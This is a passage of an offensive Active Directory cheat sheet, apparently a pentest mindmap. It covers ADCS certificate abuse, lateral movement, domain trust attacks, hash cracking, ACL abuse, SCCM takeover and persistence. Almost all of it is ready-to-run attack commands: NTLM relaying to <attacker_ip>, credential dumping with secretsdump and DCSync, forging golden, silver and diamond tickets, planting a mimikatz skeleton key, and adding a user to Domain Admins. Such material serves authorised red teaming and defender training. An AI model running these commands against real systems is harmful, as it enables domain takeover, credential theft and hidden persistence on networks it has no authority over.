- ESC8  → _Pass the ticket >>> DCSYNC || LDAP shell_
  - `ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController`
    - `Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt`
    - `gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>`
  - `certipy relay -target http://<ip_ca>`
    - `certipy auth -pfx <certificate> -dc-ip <dc_ip>`

### Misconfigured Certificate Template
- ESC1  → _Pass the certificate_
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name> -upn <target_user>@<domain>`
  - `certify.exe request /ca:<server>\<ca-name>   /template:"<vulnerable template name>" [/altname:"Admin"]`
- ESC2  → _ESC3_
- ESC3
  - `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"`
    - `certify.exe request request /ca:<server>\<ca-name> /template:<template>  /onbehalfof:<domain>\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]`
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name>`
    - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template  '<vulnerable template name>'  -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>`
- ESC13  → _Pass The Certificate (PKINIT)_
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server>  -template '<vulnerable template name>' -ca <ca_name>`
  - `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"`
- ESC15
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]``  → _Pass the certificate (only Schannel)_
  - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]``  → _Pass the certificate_
    - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>`

### Misconfigured ACL
- ESC4
  - write privilege over a certificate template
    - `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug``  → _ESC1_
    - restore template
      - `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json`
- ESC7
  - Manage CA
    - `certipy ca -ca <ca_name> -add-officer  '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>``  → _ESC7 Manage certificate_
  - Manage certificate
    - `certipy ca  -ca <ca_name> -enable-template '<ecs1_vuln_template>' -username <user>@<domain> -password <password>`
      - `certipy  req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn '<target_user>'`
        - error, but save private key and get issue request
    - Issue request
      - `certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>`
        - `certipy req -u <user>@<domain> -p '<password>'  -ca <ca_name> -retreive <request_id>``  → _Pass the certificate_

### Vulnerable PKI Object access control
- ESC5
  - Vulnerable acl on PKI  → _ACL_
  - Golden certificate
    - `certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>`
      - `certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>``  → _Pass the certificate_

### Misconfigured Certificate Authority
- ESC6 `@CVE@`  → _ESC1_
  - Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication
- ESC11  → _Pass the ticket >>> DCSYNC >>> Domain Admin_
  - `ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>`
    - `Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt`
    - `gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>`
  - `certipy relay -target rpc://<ip_ca> -ca '<ca_name>'`
    - `certipy auth -pfx <certificate> -dc-ip <dc_ip>`

### Abuse Certificate Mapping
- ESC9/ESC10 (implicit)
  - `certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>`
    - ESC9/ESC10 (Case 1)
      - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator``  → _reset accountB UPN_
        - ESC9
          - `certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>`
        - ESC10 (case 1)
          - `certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>`
    - ESC10 (Case 2)
      - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'``  → _ESC10  Case1_
  - reset accountB UPN
    - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>``  → _Pass The Certificate_
      - [Kerberos Mapping] ESC9/ESC10(Case 1)
      - [Schannel Mapping] ESC9/ESC10 (Case 2)
- ESC14 (explicit)

## Lateral Move  (`lat_move`)

_Tools:_ Enter-PSSession, MATCH, Rubeus.exe, atexec.py, certipy, dcomexec.py, evil-winrm, getTGT.py, getnthash.py, gettgtpkinit.py, impacket, lookupsid.py, mimikatz, mssqlclient.py, nxc, passthecert.py, psexec.exe, psexec.py, psexecsvc.py, reg.py, secretsdump.py, smbclient-ng.py, smbclient.py, smbexec.py, tgssub.py, ticketConverter.py, wmiexec.py, xfreerdp

### Clear text Password
_flow:_ Admin
- Interactive-shell - psexec  → _Authority/System_
  - `psexec.py <domain>/<user>:<password>@<ip>`
  - `psexec.exe -AcceptEULA \\<ip>`
  - `psexecsvc.py <domain>/<user>:<password>@<ip>`
- Pseudo-shell (file write and read)
  - `atexec.py  <domain>/<user>:<password>@<ip> "command"`
  - `smbexec.py  <domain>/<user>:<password>@<ip>`
  - `wmiexec.py  <domain>/<user>:<password>@<ip>`
  - `dcomexec.py  <domain>/<user>:<password>@<ip>`
  - `nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>`
- WinRM  → _Low access || Admin_
  - `evil-winrm -i <ip> -u <user> -p <password>`
  - `Enter-PSSession -ComputerName <computer> -Credential <domain>\<user>`
  - `nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>`
- RDP  → _Low access || Admin_
  - `xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>`
- SMB  → _Search files_
  - `smbclient.py <domain>/<user>:<password>@<ip>`
  - `smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>`
- MSSQL  → _MSSQL_
  - `nxc mssql <ip_range> -u <user> -p <password>`
  - `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>`

### NT Hash
- Pass the Hash
  - MSSQL/PseudoShell PsExec/SMB...  → _Admin_
    - `impacket : same as with creds, but use -hashes ':<hash>'`
    - `nxc : same as with creds, but use -H ':<hash>'`
  - `mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"``  → _Admin_
  - RDP  → _Low access || Admin_
    - `reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'`
      - `xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>`
  - WinRM  → _Low access || Admin_
    - `evil-winrm -i <ip> -u <user> -H <hash>`
- Overpass the Hash / Pass the key (PTK)  → _Admin_
  - `Rubeus.exe asktgt /user:victim /rc4:<rc4value>`
    - `Rubeus.exe ptt /ticket:<ticket>`
    - `Rubeus.exe createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]`
  - `getTGT.py <domain>/<user> -hashes :<hashes>`

### Kerberos
- Pass the Ticket (ccache / kirbi)
  - Convert Format
    - `ticketConverter.py <kirbi||ccache> <ccache||kirbi>`
  - `export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache``  → _Admin_
    - `impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket`
  - `mimikatz kerberos::ptc "<ticket>"`
  - `Rubeus.exe ptt /ticket:<ticket>`
  - `proxychains secretsdump.py -k'<domain>'/'<user>'@'<ip>'`
  - Modify SPN  → _PassTheTicket_
    - `tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>" #pr 1256`
- Aeskey  → _Admin_
  - `impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)`
  - `proxychains secretsdump.py -aesKey <key> '<domain>'/'<user>'@'<ip>'`

### Socks (relay)
- `proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids`
- `proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass``  → _MSSQL_
- `proxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'``  → _DCSYNC_
- `proxychains smbclient.py -no-pass <user>@<ip>``  → _Search files_
- `proxychains atexec.py  -no-pass  <domain>/<user>@<ip> "command"``  → _Authority/System_
- `proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>``  → _Authority/System_

### Certificate (pfx)
- unpac the hash
  - `certipy auth -pfx <crt_file> -dc-ip <dc_ip>`
  - `gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> "<domain>/<dc_name>" <tgt.ccache>`
    - `getnthash.py -key '<AS-REP encryption key>' '<domain>'/'<dc_name>'`
- Pass the certificate
  - pkinit
    - `gettgtpkinit.py -cert-pfx "<pfx_file>" ^[-pfx-pass  "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"`
    - `Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show`
    - `certipy auth -pfx <crt_file> -dc-ip <dc_ip>`
  - schannel
    - `certipy auth -pfx <pfx_file> -ldap-shell`
      - add_computer
        - Set RBCD  → _RBCD_
    - `certipy cert -pfx "<pfx_file>" -nokey -out "user.crt"`
      - `certipy cert -pfx "<pfx_file>" -nocert -out "user.key"`
        - `passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>`

### MSSQL
- find mssql access
  - `nxc mssql <ip> -u <user> -p <password> -d <domain>``  → _MSSQL_
- Users or Computers with SQL admin
- `MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p``  → _MSSQL_
- `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>`
  - `enum_db`
  - `enable_xp_cmdshell`
    - `xp_cmdshell <cmd>``  → _Low Access_
  - `enum_impersonate`
    - `exec_as_user <user>``  → _MSSQL_
    - `exec_as_login <login>``  → _MSSQL_
  - `xp_dir_tree <ip>``  → _COERCE SMB_
  - `trustlink`
    - `sp_linkedservers`
      - `use_link``  → _MSSQL || Trust_

## Trusts  (`trusts`)

_Tools:_ Get-DomainSID, Get-DomainTrust, Get-DomainTrustMapping, Get-SQLServerLinkCrawl, MATCH, ldeep, lookupsid.py, mimikatz, mssqlclient.py, nltest.exe, raiseChild.py, secretsdump.py, sharphound.exe, ticketer.py

### Enumeration
- `nltest.exe /trusted_domains`
- `([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()`
- `Get-DomainTrust -Domain <domain>`
- `Get-DomainTrustMapping`
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts`
- `sharphound.exe -c trusts -d <domain>`
  - `MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p`
- Get Domains SID
  - `Get-DomainSID -Domain <domain> Get-DomainSID -Domain <target_domain>`
  - `lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0`

### Child->Parent
- Trust Key  → _PassTheTicket_
  - `mimikatz lsadump::trust /patch`
    - `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt`
  - `secretsdump.py -just-dc-user '<parent_domain>$'   <domain>/<user>:<password>@<dc_ip>`
    - `ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser`
- Golden Ticket  → _PassTheTicket_
  - `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt`
    - `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt`
  - `raiseChild.py <child_domain>/<user>:<password>`
  - `ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser`
- Unconstrained delegation
  - coerce parent_dc on child_dc domain  → _unconstrained delegation_

### Parent->Child
- same as Child to parent

### External Trust
- DomainA <--> DomainB trust (B trust A, A trust B)
  - from A to B FOREST_TRANSITIVE
    - password reuse  → _lat move (creds/pth/...)_
    - Foreign group and users  → _ACL_
      - Users with foreign Domain Group Membership
        - `MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p`
      - Group with foreign Domain Group Membership
        - `MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p`
    - SID History on B  → _PassTheTicket_
      - Golden ticket
        - `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt`
          - `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt`
        - `ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> fakeuser`
      - Trust ticket
        - `secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>`
          - `ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser`
    - ADCS abuse  → _ADCS_
  - from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL
      - Unconstrained delegation
        - coerce dc_b on dc_a  → _unconstrained delegation_
- DomainA <-- DomainB trust (B trust A / A access B)
  - Same as double trust, but no unconstrained delegation as B can't connect to A
- DomainA --> DomainB trust (A trust B / B access A)
  - password reuse  → _lat move (creds/pth/...)_

### Mssql links
_flow:_ MSSQL
- MSSQL trusted links doesn't care of trust link
  - `Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>`
  - `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>`
    - trustlink
      - sp_linkedservers
        - use_link

## Crack hash  (`crack_hash`)

_Tools:_ hashcat, john

### LM (299bd128c1101fd6)
- `john --format=lm hash.txt --wordlist=<rockyou.txt>`
- `hashcat -m 3000 -a 0 hash.txt <rockyou.txt>`

### NT (b4b9b02e6f09a9bd760...)
- `john --format=nt hash.txt --wordlist=<rockyou.txt>`
- `hashcat -m 1000 -a 0 hash.txt <rockyou.txt>`

### NTLMv1 (user::85D5BC...)
- `john --format=netntlm hash.txt --wordlist=<rockyou.txt>`
- `hashcat -m 1000 -a 0 hash.txt <rockyou.txt>`
- crack.sh
  [https://crack.sh/](https://crack.sh/)

### NTLMv2 (user::N46iSNek...)
- `john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>`
- `hashcat -m 5600 -a 0 hash.txt <rockyou.txt>`

### Kerberos 5 TGS ($krb5tgs$23$...)
- `john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>`
- `hashcat -m 13100 -a 0 hash.txt <rockyou.txt>`

### Kerberos 5 TGS AES128 ($krb5tgs$17...)
- `hashcat -m 19600 -a 0 hash.txt <rockyou.txt>`

### Kerberos ASREP ($krb5asrep$23...)
- `hashcat -m 18200 -a 0 hash.txt <rockyou.txt>`

### MSCache 2 (very slow) ($DCC2$10240...)
- `hashcat -m 2100 -a 0 hash.txt <rockyou.txt>`

### Timeroast hash ($sntp-ms$...)
- `hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l`

### pxe hash ($sccm$aes128$...)
- `hashcat -m 19850 -a 0 hash.txt <rockyou.txt>`

## ACLs/ACEs permissions  (`acl`)

_Tools:_ Get-DomainOU, Get-DomainObjectAcl, Get-LapsADPassword, MATCH, OUned.py, certipy, dnscmd.exe, gMSADumper.py, ldeep, mimikatz, msf>, nxc, pywhisker.py, sc, secretsdump.py, targetedKerberoast.py

### Dcsync
_flow:_ Domain Admin || Lateral move || Crack hash
- Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts
- `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator`
- `secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'`

### can change msDS-KeyCredentialLInk (Generic Write) + ADCS
_flow:_ PassTheCertificate
- Shadow Credentials
  - `certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'`
  - `pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"`

### On Group
- GenericAll/GenericWrite/Self/Add Extended Rights
  - Add member to the group
- Write Owner
  - Grant Ownership
- WriteDACL + WriteOwner
  - Grant rights
    - Give yourself generic all

### On Computer
- GenericAll / GenericWrite
  - msDs-AllowedToActOnBehalf  → _RBCD_
  - add Key Credentials  → _shadow credentials_

### On User
- GenericAll / GenericWrite
  - Change password
    - `net user <user> <password> /domain``  → _User with clear text pass_
  - add SPN (target kerberoasting)
    - `targetedKerberoast.py -d <domain> -u <user> -p <pass>``  → _Hash found (TGS)_
  - add key credentials  → _shadow credentials_
  - login script  → _Access_
- ForceChangePassword
  - `net user <user> <password> /domain``  → _User with clear text pass_

### On OU
- Write Dacl
  - ACE Inheritance
    - Grant rights
- GenericAll / GenericWrite / Manage Group Policy Links
  - `OUned.py --config config.ini`

### ReadGMSAPassword
- `gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'`
- `nxc ldap <ip> -u <user> -p <pass> --gmsa`
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa`

### Get LAPS passwords
- Who can read LAPS
  - `MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p`
- Read LAPS  → _Admin_
  - `Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize`
  - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps`
  - `foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}`
  - `nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps`
  - `msf> use post/windows/gather/credentials/enum_laps`

### GPO
- Who can control GPOs
  - `MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p`
- SID of principals that can create new GPOs in the domain
  - `Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs  | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`
- Return the principals that can write to the GP-Link attribute on OUs
  - `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl`
- Generic Write on  GPO
  - Abuse GPO  → _ACCESS_

### DNS Admin
- DNSadmins abuse (CVE-2021-40469) `@CVE@`  → _Admin_
  - `dnscmd.exe /config /serverlevelplugindll <\\path\to\dll> # need a dnsadmin user`
  - `sc \\DNSServer stop dns sc \\DNSServer start dns`

## SCCM  (`sccm`)

_Tools:_ SCCMHound.exe, SCCMSecrets.py, SharpSCCM.exe, cmloot.py, dnstool.py, dploot.py, ldeep, mssqlclient.py, ntlmrelayx.py, nxc, policysecretunobfuscate.py, query, sccm-http-looter, sccmhunter.py, sccmwtf.py, secretsdump.py, smbexec.py

### recon
- `sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug`
  - `sccmhunter.py show -all`
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm`
- `nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares`

### Creds-1 No credentials
_flow:_ NAA credentials || User + Pass
- Extract from pxe See no creds  → _PXE_

### Elevate-1:Relay on site systems Simple user
_flow:_ Admin on Site system
- coerce sccm site server
  - `ntlmrelayx.py -tf <site_systems> -smb2support`

### Elevate-2:Force client push Simple user
_flow:_ Admin
- `ntlmrelayx.py -t <sccm_server> -smb2support -socks # listen connection`
  - `SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push install`
    - `proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>`
      - cleanup

### Elevate-3:Automatic client push Simple user
_flow:_ Relay ntlm
- Create DNS A record for non existing computer x
  - `dnstool.py -u '<domain>\<user>' -p <pass>  -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>`
    - Enroll new computer x in AD  then remove host SPN from the machine account
      - `setspn -D host/<newcomputer> <newcomputer> setspn -D host/<newcomputer>.<domain> <newcomputer>`
        - wait 5m for client push
          - `ntlmrelayx.py -tf <no_signing_target> -smb2support -socks`
            - cleanup

### CRED-6 Loot creds
_flow:_ User + Pass
- SCCM SMB service (445/TCP) on a DP
  - `cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt`
- SCCM HTTP service (80/TCP or 443/TCP) on a DP
  - `SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'`
  - `SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'`
  - `sccm-http-looter -server <ip_dp>`

### Takeover-1:relay to mssql db Simple user
_flow:_ SCCM ADMIN
- SCCM MSSQL != SSCM server
  - `sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked`
    - `ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q "<query>"`
      - coerce sccm_mssql -> attacker
        - `sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>`

### Takeover-2:relay to mssql server Simple user
_flow:_ Admin MSSQL
- SCCM MSSQL != SSCM server
  - `ntlmrelayx.py -t <sccm_mssql> -smb2support -socks`
    - coerce sccm_server
      - `proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>`

### Creds-2:Policy Request Credentials Simple user
_flow:_ User + Pass
- add computer
  - `sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\<computer_added>$' '<computer_pass>'`
    - get NetworkAccessUsername and NetworkAccessPassword
      - `policysecretunobfuscate.py`
        - delete device created after sccmadmin
  - `SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>"`
    - cleanup

### Creds-3Creds-4 Computer Admin user
_flow:_ NAA credentials
- `dploot.py sccm -u <admin> -p '<password>' <sccm_target>`
- `sccmhunter.py dpapi  -u <admin> -p '<password>' -target <sccm_target> -debug`
- `SharpSCCM.exe local secrets -m disk`
- `SharpSCCM.exe local secrets -m wmi`

### Creds-5 SCCM admin
_flow:_ Site DB credentials
- `secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>`
  - `mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>`
    - `use CM_<site_code>;`
      - `SELECT * FROM SC_UserAccount;`
        - `sccmdecryptpoc.exe <cyphered_value>`

### EXEC-1/2 SCCM admin
_flow:_ lat
- `SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner`
- `sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>`
    - `get_device <hostname>`
      - `interact <device_id>`
        - `script xploit.ps1`

### Cleanup
- `SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"`
  - `SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>`

### Post exploit
- as sccm admin
  - `SCCMHound.exe --server <server> --sitecode <sitecode>``  → _Users sessions_

## Persistence  (`persistence`)

_Tools:_ PowerShell, certipy, mimikatz, ticketer.py

### ADD DA
- `net group "domain admins" myuser /add /domain`

### Golden ticket
- `ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>`
- `mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"`

### Silver Ticket
- `mimikatz "kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"`
- `ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>`

### Directory Service Restore Mode (DSRM)
- `PowerShell New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`

### Skeleton Key
- `mimikatz "privilege::debug" "misc::skeleton" "exit" #password is mimikatz`

### Custom SSP
- `mimikatz "privilege::debug" "misc::memssp" "exit"`
  - C:\Windows\System32\kiwissp.log

### Golden certificate
- `certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>`
  - `certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>`

### Diamond ticket
- `ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>`

### Saphire Ticket
- `ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored'`

### DC shadow

### ACL manipulation

### ...
